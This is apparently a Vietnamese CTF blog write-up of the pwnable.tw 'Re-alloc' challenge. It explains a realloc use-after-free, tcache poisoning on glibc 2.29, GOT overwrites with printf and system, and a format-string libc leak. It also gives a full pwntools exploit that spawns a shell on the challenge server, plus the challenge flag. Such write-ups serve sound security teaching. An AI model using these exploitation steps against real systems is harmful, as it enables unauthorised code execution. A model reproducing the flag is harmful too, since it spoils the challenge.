+++
title = 'Pwnable.tw - Re-alloc'
date = 2026-09-18T21:50:21+07:00
draft = false
categories = ["pwn"]
series = ["Pwnable.tw"]
+++

## Re-alloc

`nc chall.pwnable.tw 10106`

### 1. Phân tích Binary

```js
pwndbg> checksec
File:       /home/lwd3c/Desktop/Pwn/pwnable.tw/re-alloc-heap/re-alloc_patched
Arch:       amd64-64-little
RELRO:      Partial RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        No PIE (0x3fe000)
RUNPATH:    b'.'
FORTIFY:    Enabled
Stripped:   No
```

libc là glibc **2.29** (Ubuntu GLIBC 2.29-0ubuntu2), có debug symbol, và đúng là libc của server.

- No PIE → GOT/PLT/bss cố định (`atoll@got = 0x404048`, `printf@plt = 0x401070`, mảng heap `0x4040b0`)
- Partial RELRO → GOT ghi được
- NX + canary + FORTIFY → không đụng stack

Menu 4 lệnh, mảng heap toàn cục chỉ **2 phần tử**, size giới hạn `<= 0x78`:

```c
unsigned __int64 heap[2];   // 0x4040b0

int allocate() {
  printf("Index:"); v2 = read_long();
  if ( v2 > 1 || heap[v2] )  return puts("Invalid !");
  printf("Size:"); size = read_long();
  if ( size <= 0x78 ) {
    v4 = realloc(NULL, size);            // malloc
    if ( v4 ) {
      heap[v2] = v4;
      printf("Data:");
      heap[v2][read_input(heap[v2], size)] = 0;
    }
  }
}

int reallocate() {
  printf("Index:"); v1 = read_long();
  if ( v1 > 1 || !heap[v1] )  return puts("Invalid !");
  printf("Size:"); size = read_long();
  if ( size > 0x78 )  return puts("Too large!");
  v3 = realloc(heap[v1], size);          // size == 0 -> free, trả NULL
  if ( !v3 )  return puts("alloc error");
  heap[v1] = v3;                          // return sớm nên heap[v1] KHÔNG bị xoá
  printf("Data:");
  read_input(heap[v1], size);
}

int rfree() {
  printf("Index:"); v2 = read_long();
  if ( v2 <= 1 ) {
    realloc(heap[v2], 0);
    heap[v2] = 0;                         // chỉ rfree mới xoá con trỏ
  }
}
```

`read_long()` đọc 16 bytes rồi `return atoll(nptr)` - chính cái cổng này về sau thành format string.

#### Bug 1 - UAF qua `reallocate(idx, 0)`

`realloc(ptr, 0)` tương đương `free(ptr)`. Khi nó trả NULL, hàm in `"alloc error"` và **không** set `heap[idx] = 0` → con trỏ vẫn trỏ vào chunk đã free.

#### Bug 2 - `realloc(dangling, cùng size)` giữ chunk trong bin

Metadata chunk còn nguyên nên glibc coi nó đang in-use và trả về đúng con trỏ cũ. Mọi `read_input` sau đó ghi vào **một chunk vẫn nằm trong tcache**, tức ghi đè được `next` (fd) của tcache entry.

Ngoài ra chương trình **không có primitive print** nào, nên leak bắt buộc phải đi qua việc hijack GOT thành `printf`.

#### Nền glibc 2.29

Đối chiếu `malloc/malloc.c` nhánh `glibc-2.29`:

```c
typedef struct tcache_entry {
  struct tcache_entry *next;                 // offset 0 (fd)
  struct tcache_perthread_struct *key;       // offset 8
} tcache_entry;
```

Hai điểm quyết định:

- **Chưa có safe-linking** (chỉ từ 2.32 mới XOR fd) → ghi thẳng `0x404048` vào `next`
- **Nhánh tcache của `_int_malloc` chỉ kiểm `entries[tc_idx] != NULL`, không kiểm `counts[tc_idx] > 0`** ở bản 2.29 → chỉ cần để lại `entries[idx] = 0x404048` là malloc bin đó trả về `0x404048`
- Double-free bị chặn bằng `key == tcache`, nhưng ta ghi đè cả 16 byte đầu chunk nên `key` vỡ, không cần quan tâm

### 2. Khai thác

#### Đầu độc tcache bin

```js
alloc(0, asz, b"A"*8)            # chunk A; bin = usize2tidx(asz)
realloc(0, 0)                    # FREE A (tcache), heap[0] dangling
realloc(0, asz, p64(0x404048))   # realloc in-place, vẫn trong bin -> ghi A->next
free(0)                          # giữ A trong bin, thêm lần free thứ 2
alloc(1, asz, b"junk")           # pop A 1 lần -> entries[idx] = A->next = 0x404048

# dọn cả 2 slot heap mà KHÔNG phá entries[idx]
realloc(0, bsz, b"C"*8)   # realloc lớn lên -> A dời đi, chunk cũ nằm lại bin
free(0)                   # heap[0] = NULL
realloc(1, bsz+0x10, b"C"*8)
free(1)                   # heap[1] = NULL
```

gdb xác nhận: `entries[2] = 0x404048` tại `0x405060` (tcache idx 2 ứng với request `0x30`), `heap[0] = heap[1] = NULL`.

Sau đó chỉ cần một `alloc(idx, asz, payload)` là malloc bin đó trả về `0x404048` và `read_input` ghi `payload` thẳng vào `atoll@got`.

#### Chuẩn bị hai bin độc trước khi đụng `atoll`

Cả hai block poison **bắt buộc** chạy khi `atoll` vẫn là hàm thật. Sau khi `atoll@got = printf` thì mọi `read_long` trở thành `printf(buf)`, không parse số được nữa.

```py
posion_slot(0x20, 0x40)   # bin cho request 0x20 (chunk 0x30) - để ghi printf
posion_slot(0x30, 0x60)   # bin cho request 0x30 (chunk 0x40) - để ghi system
```

#### GOT write lần 1: `atoll@got = printf@plt`

```py
alloc(0, 0x20, p64(exe.plt["printf"]))
```

#### Leak libc bằng format string

Gọi `rfree`, vòng `"Index:"` gọi `read_long` → `atoll` → `printf(nptr)` với `nptr` là chuỗi ta nhập:

```py
io.sendlineafter(b"choice:", b"3"); io.sendlineafter(b"Index:", b"%7$p")
stdout = int(io.recvline().strip(), 16)
libc.address = stdout - libc.sym["_IO_2_1_stdout_"]   # offset 0x1e5760
```

```js
leak=%7$p -> 0x7fa33faca760
libc.base  0x7fa33f8e5000   (page-aligned)
```

#### GOT write lần 2: `atoll@got = system`

Lúc này `atoll` đã là `printf`, nên Index/Size phải "mã hoá" qua **giá trị trả về của printf**:

```py
io.sendlineafter(b"choice:", b"1")
io.sendafter(b"Index:",  b"\x01")    # printf("\x01") xuất 1 ký tự, trả 1 -> index 1
io.sendlineafter(b"Size:",  b"%47c") # printf("%47c") in 47 ký tự, trả 47 = 0x2f -> chunk 0x40
io.sendlineafter(b"Data:",  p64(libc.sym["system"]))
```

#### Trigger

```py
io.sendlineafter(b"choice:", b"3")
io.sendlineafter(b"Index:", b"/bin/sh\x00")  # read_long -> atoll(=system)("/bin/sh")
io.interactive()
```

Local 3/3 lần ra shell, remote bắn phát đầu ăn ngay.

`FLAG: FLAG{r3all0c_the_memory_r3all0c_the_sh3ll}`

```py
#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF('./re-alloc_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
context.log_level = 'info'
HOST, PORT = 'chall.pwnable.tw', 10106

def alloc(idx, size, data):
    io.sendlineafter(b"choice:", b"1")
    io.sendlineafter(b"Index:", str(idx).encode())
    io.sendlineafter(b"Size:", str(size).encode())
    io.sendafter(b"Data:", data)

def realloc(idx, size, data):
    io.sendlineafter(b"choice:", b"2")
    io.sendlineafter(b"Index:", str(idx).encode())
    io.sendlineafter(b"Size:", str(size).encode())
    io.sendafter(b"Data:", data)

def realloc_free(idx):
    io.sendlineafter(b"choice:", b"2")
    io.sendlineafter(b"Index:", str(idx).encode())
    io.sendlineafter(b"Size:", b"0")

def free(idx):
    io.sendlineafter(b"choice:", b"3")
    io.sendlineafter(b"Index:", str(idx).encode())

def posion_slot(asz, bsz):
    alloc(0, asz, b"A"*8)
    realloc_free(0)
    realloc(0, asz, p64(exe.got["atoll"]))
    free(0)
    alloc(1, asz, b"junk")
    realloc(0, bsz, b"C"*8)
    free(0)
    realloc(1, bsz+0x10, b"C"*8)
    free(1)

io = remote(HOST, PORT) if args.REMOTE else process([exe.path])

posion_slot(0x20, 0x40)
posion_slot(0x30, 0x60)

alloc(0, 0x20, p64(exe.plt["printf"]))                 # atoll@got = printf@plt

io.sendlineafter(b"choice:", b"3")
io.sendlineafter(b"Index:", b"%7$p")
libc.address = int(io.recvline().strip(), 16) - libc.sym["_IO_2_1_stdout_"]
log.success(f"libc = {libc.address:#x}")

io.sendlineafter(b"choice:", b"1")
io.sendafter(b"Index:",  b"\x01")
io.sendlineafter(b"Size:",  b"%47c")
io.sendlineafter(b"Data:",  p64(libc.sym["system"]))   # atoll@got = system

io.sendlineafter(b"choice:", b"3")
io.sendlineafter(b"Index:", b"/bin/sh\x00")
io.interactive()
```
